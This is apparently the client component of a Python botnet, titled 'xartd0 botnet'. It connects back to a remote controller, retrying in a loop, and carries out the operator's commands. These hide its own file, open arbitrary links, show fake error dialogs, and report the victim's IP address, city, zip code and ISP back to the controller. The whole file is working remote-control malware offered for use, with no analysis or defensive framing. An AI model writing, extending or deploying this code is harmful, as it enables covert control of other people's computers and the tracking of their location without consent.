from urllib import response
from imports import *

s = socket.socket()

def setup_bot():
    while True:
        try:
            time.sleep(20)
            s.connect((HOST_CLIENT, PORT))
            break
        except:
            continue

setup_bot()

try:
    while True:
        command = s.recv(1024).decode()
        print(command)
        if 'error' in command:
            s.send('  └─▷ The message was sent successfully'.encode())
            ctypes.windll.user32.MessageBoxW(0, command.partition(' ')[2], "xartd0 botnet", 16)
        elif command == 'exit':
            s.send('  └─▷ Session was successfully closed'.encode())
            s.close()
            exit(0)
        elif command == 'invisible':
            s.send(f'  └─▷ {sys.argv[0]} was successfully hidden'.encode())
            subprocess.check_call(["attrib","+H",sys.argv[0]])
        elif 'open-link' in command:
            s.send(f'  └─▷ {command.split(" ")[1]} has been successfully opened'.encode())
            webbrowser.open(command.split(' ')[1])
        elif command == 'help':
            s.send(f'''  ├ Help
  └ open-link (link)
    └ invisible (make the file hidden)
      └ error (message) (send an error message)
        └ exit (close client)
          └ help (help menu)
            '''.encode())
        elif command == 'ip-info':
            response = requests.get(f'http://ip-api.com/json/').json()
            s.send(f'''  ├ Ip: {response["query"]}
  └ Country: {response["country"]}
    └ City: {response["regionName"]}
      └ Zip-code: {response["zip"]}
        └ Isp: {response["isp"]}'''.encode())
        else:
            s.send('  └─▷ Command not found'.encode())
except:
    setup_bot()